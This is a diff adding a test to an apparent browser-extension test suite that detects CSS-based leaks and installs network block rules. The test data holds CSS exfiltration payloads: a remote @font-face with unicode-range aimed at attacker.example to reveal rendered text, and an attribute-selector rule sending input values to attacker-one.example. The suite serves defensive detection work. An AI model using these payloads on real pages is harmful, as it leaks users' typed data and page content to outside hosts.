@@ -190,6 +190,23 @@ describe("DNR browser integration", () => {
     expect(installedRules.some((rule) => regexFilter(rule)?.includes("#x"))).toBe(false);
   });
 
+
+  it("installs finding-derived future-block rules for high-confidence rendered-text fingerprinting findings when the experimental guard reports them", async () => {
+    const finding = analyzeStylesheet({
+      cssText: '@font-face{font-family:"RenderedLeak";src:url("https://attacker.example/rendered.woff2");unicode-range:U+0041}.secret::first-line{font-family:"RenderedLeak";text-transform:uppercase}',
+      pageUrl: "https://app.example/account",
+      sourceKind: "style_element",
+      sourceUrl: "https://app.example/account",
+      enableCssFingerprintingGuard: true,
+    }).findings.find((item) => item.reasons.includes("privacy.css_fingerprinting.rendered_text_signal")) as Finding;
+
+    expect(finding.reasons).toContain("sink.font_remote");
+    expect(finding.reasons).toContain("privacy.css_fingerprinting.browser_specific_text_signal");
+
+    const result = await blockHighConfidenceFindingUrls([finding], 37, DEFAULT_SITE_POLICY, "balanced");
+    expect(result.ruleInstalledFindings.has(finding.id)).toBe(true);
+  });
+
   it("allocates tab-scoped DNR rule IDs without modulo collisions", async () => {
     const firstFinding = analyzeStylesheet({
       cssText: 'input[value^="a"]{background:url(https://attacker-one.example/a)}',
